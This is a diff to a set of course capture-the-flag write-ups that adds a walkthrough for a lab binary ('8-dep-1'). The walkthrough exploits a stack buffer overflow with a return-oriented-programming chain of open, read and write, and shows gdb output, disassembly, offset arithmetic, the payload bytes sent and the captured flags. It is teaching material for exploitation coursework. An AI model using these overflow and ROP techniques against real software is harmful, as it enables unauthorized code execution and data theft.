@@ -6,7 +6,7 @@
 All the write-ups are supposed to use this import.
 
 ```python
-from pwn import asm, process, context
+from pwn import *
 ```
 
 ## 1-shellcode-32
@@ -409,4 +409,176 @@ Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 \xd2\xff\xff\x10\xed\xf7&N!
 $ cat flag
 CS6332{l1bc_sy5t3M}
+```
+
+## 8-dep-1
+
+The problem statement is below.
+
+```md
+Can you run the following functions by exploiting
+a buffer overflow vulnerability?
+
+1. fd = open("flag", O_RDONLY);
+2. read(fd, buf, 0x100);
+3. write(1, buf, 0x100);
+
+Then, the flag is yours!
+```
+
+Run it with `gdb`. From what we can observe in the data flow, we call `main`, `non_main_func`, and `input_func` sequentially.
+
+After its overview, look into more details.
+
+The `input_func` program calls `read` and `printf` like below. The buffer address, `0xffffd180`, looks useful to get the flag.
+
+```gdb
+► 0x80488d7 <input_func+41>    calll  read <read>
+        fd: 0x0
+        buf: 0xffffd180 ◂— 0x100
+        nbytes: 0x100
+► 0x80488e4 <input_func+54>    calll  printf <printf>
+        format: 0x80bb287 ◂— 'Hello %s!\n'
+        vararg: 0xffffd180 ◂— 0x10a
+```
+
+Take a look at addresses on the stack. `eip` is the next return address.
+
+```gdb
+pwndbg> info frame
+Stack level 0, frame at 0xffffd210:
+ eip = 0x80488cc in input_func; saved eip = 0x8048908
+ called by frame at 0xffffd240
+ Arglist at 0xffffd208, args: 
+ Locals at 0xffffd208, Previous frame's sp is 0xffffd210
+ Saved registers:
+  ebx at 0xffffd204, ebp at 0xffffd208, eip at 0xffffd20c
+```
+
+`0xffffd20c`(`eip`) - `0xffffd180` = 140(bytes), so we need 140 bytes to pad the gap.
+
+After `input_func`, let's look at the return address of `non_main_func`.
+
+```gdb
+pwndbg> info frame
+Stack level 0, frame at 0xffffd240:
+ eip = 0x8048908 in non_main_func; saved eip = 0x8048923
+ called by frame at 0xffffd260
+ Arglist at 0xffffd238, args: 
+ Locals at 0xffffd238, Previous frame's sp is 0xffffd240
+ Saved registers:
+  ebp at 0xffffd238, eip at 0xffffd23c
+```
+
+The next `eip` is `0xffffd23c`, and the next `eip` is `0xffffd25c`. Thus, their bytes gaps from their previous `eip`s are like these.
+
+`0xffffd23c`(2nd `eip`) - `0xffffd20c`(1st `eip`) - `0x00000004`(overwritten return address) = 44(bytes)
+
+`0xffffd25c`(3rd `eip`) - `0xffffd23c`(2nd `eip`) - `0x00000004` = 28(byte)
+
+By the way, we can find a function that calls `<__libc_open>` in `some_function` function.
+
+```assembly
+08048894 <some_function>:
+ 8048894:	55                   	push   %ebp
+ 8048895:	89 e5                	mov    %esp,%ebp
+ 8048897:	83 ec 08             	sub    $0x8,%esp
+ 804889a:	83 ec 08             	sub    $0x8,%esp
+ 804889d:	6a 00                	push   $0x0
+ 804889f:	68 68 b2 0b 08       	push   $0x80bb268
+ 80488a4:	e8 27 4a 02 00       	call   806d2d0 <__libc_open>
+ 80488a9:	83 c4 10             	add    $0x10,%esp
+ 80488ac:	c9                   	leave  
+ 80488ad:	c3                   	ret    
+```
+
+In `some_function`, `0x08048894`, there is a call of `<__libc_open>`, which takes `0x0` and `0x80bb268` as its arguments. What is `0x80bb268`? gdb tells us that it's `a.txt`. Symlinking `a.txt` to `flag` helps us to open the flag.
+
+```gdb
+pwndbg> x/s 0x80bb268
+0x80bb268:      "a.txt"
+```
+
+Moreover, we have the addresses to read and write in `input_func`.
+
+- `__libc_read` = `0x806d340`
+- `__libc_write` = `0x806d3b0`
+
+```assembly
+080488ae <input_func>:
+ 80488ae:	55                   	push   %ebp
+ 80488af:	89 e5                	mov    %esp,%ebp
+ 80488b1:	53                   	push   %ebx
+ 80488b2:	8d 9d 78 ff ff ff    	lea    -0x88(%ebp),%ebx
+ 80488b8:	81 ec 88 00 00 00    	sub    $0x88,%esp
+ 80488be:	6a 18                	push   $0x18
+ 80488c0:	68 6e b2 0b 08       	push   $0x80bb26e
+ 80488c5:	6a 01                	push   $0x1
+ 80488c7:	e8 e4 4a 02 00       	call   806d3b0 <__libc_write>
+ 80488cc:	83 c4 0c             	add    $0xc,%esp
+ 80488cf:	68 00 01 00 00       	push   $0x100
+ 80488d4:	53                   	push   %ebx
+ 80488d5:	6a 00                	push   $0x0
+ 80488d7:	e8 64 4a 02 00       	call   806d340 <__libc_read>
+ 80488dc:	58                   	pop    %eax
+ 80488dd:	5a                   	pop    %edx
+ 80488de:	53                   	push   %ebx
+ 80488df:	68 87 b2 0b 08       	push   $0x80bb287
+ 80488e4:	e8 f7 64 00 00       	call   804ede0 <_IO_printf>
+ 80488e9:	31 c0                	xor    %eax,%eax
+ 80488eb:	8b 5d fc             	mov    -0x4(%ebp),%ebx
+ 80488ee:	c9                   	leave  
+ 80488ef:	c3                   	ret    
+```
+
+The remaining question is how to call them.
+
+Use return-oriented-programming, with which we chain functions calls. However, there is a problem about functions' arguments. We need to pop previous functions' arguments.
+
+In `gdb-peda`, there is a built-in function to search for popping.
+
+```gdb
+pwndbg> rop --grep 'pop' -- --nojop
+```
+
+We get `pop3_ret` for it. Insert this function after calling `__libc_read`, you can call `__libc_write` as expected.
+
+Then, we get the flag.
+
+```bash
+TXK220008@ctf-vm1:~/unit2/8-dep-1$ ./solve8.py 
+[+] Starting local process './8-dep-1': pid 11161
+[DEBUG] Received 0x18 bytes:
+    b'Please type your name: \n'
+[DEBUG] Sent 0xbd bytes:
+    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000080  00 00 00 00  00 00 00 00  00 00 00 00  94 88 04 08  │····│····│····│····│
+    00000090  40 d3 06 08  0b 2e 06 08  03 00 00 00  60 d2 ff ff  │@···│·.··│····│`···│
+    000000a0  00 01 00 00  b0 d3 06 08  0b 2e 06 08  01 00 00 00  │····│····│·.··│····│
+    000000b0  60 d2 ff ff  00 01 00 00  cc 5b 09 08  0a           │`···│····│·[··│·│
+    000000bd
+[*] Switching to interactive mode
+[*] Process './8-dep-1' stopped with exit code 10 (pid 11161)
+[DEBUG] Received 0x108 bytes:
+    00000000  48 65 6c 6c  6f 20 21 0a  43 53 36 33  33 32 7b 30  │Hell│o !·│CS63│32{0│
+    00000010  70 6e 5f 72  33 41 64 5f  77 31 72 74  45 7d 0a ff  │pn_r│3Ad_│w1rt│E}··│
+    00000020  f7 db ff ff  06 dc ff ff  0e dc ff ff  23 dc ff ff  │····│····│····│#···│
+    00000030  ab dc ff ff  de dc ff ff  fc dc ff ff  13 dd ff ff  │····│····│····│····│
+    00000040  25 dd ff ff  66 dd ff ff  9c dd ff ff  c8 dd ff ff  │%···│f···│····│····│
+    00000050  16 de ff ff  36 de ff ff  a1 de ff ff  0a df ff ff  │····│6···│····│····│
+    00000060  81 df ff ff  aa df ff ff  cc df ff ff  e0 df ff ff  │····│····│····│····│
+    00000070  00 00 00 00  20 00 00 00  d0 cf ff f7  21 00 00 00  │····│ ···│····│!···│
+    00000080  00 c0 ff f7  10 00 00 00  ff fb 8b 07  06 00 00 00  │····│····│····│····│
+    00000090  00 10 00 00  11 00 00 00  64 00 00 00  03 00 00 00  │····│····│d···│····│
+    000000a0  34 80 04 08  04 00 00 00  20 00 00 00  05 00 00 00  │4···│····│ ···│····│
+    000000b0  06 00 00 00  07 00 00 00  00 00 00 00  08 00 00 00  │····│····│····│····│
+    000000c0  00 00 00 00  09 00 00 00  36 87 04 08  0b 00 00 00  │····│····│6···│····│
+    000000d0  22 27 00 00  0c 00 00 00  22 27 00 00  0d 00 00 00  │"'··│····│"'··│····│
+    000000e0  23 27 00 00  0e 00 00 00  27 4e 00 00  17 00 00 00  │#'··│····│'N··│····│
+    000000f0  01 00 00 00  19 00 00 00  7b d3 ff ff  1a 00 00 00  │····│····│{···│····│
+    00000100  00 00 00 00  1f 00 00 00                            │····│····│
+    00000108
+Hello !
+CS6332{0pn_r3Ad_w1rtE}
 ```
